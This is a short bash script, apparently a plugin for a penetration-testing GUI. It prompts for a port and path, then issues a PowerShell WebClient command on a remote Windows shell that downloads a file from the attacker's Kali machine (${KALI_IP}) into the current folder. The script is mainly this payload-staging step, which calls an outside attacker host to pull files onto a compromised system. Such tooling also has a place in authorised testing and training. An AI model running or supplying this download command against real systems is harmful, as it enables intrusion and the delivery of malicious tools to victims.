#!/bin/bash

: '
PowerShell: Save file and save in current remote folder.
'


# Generate GUI form items (label, type (optional: default text), name, default (optional))
PORT_FIELD=$(form_item  "port" "port")
PATH_FIELD=$(form_item  "path" "path")

# Generate GUI form
generate_form "${PORT_FIELD}" "${PATH_FIELD}"

PORT=${form_data["port"]}
PATH=${form_data["path"]}
FILE_NAME=$(basename $PATH)

execute_command "powershell \"(New-Object System.Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${PORT}/${PATH}', '${FILE_NAME}')\""
create_new_line
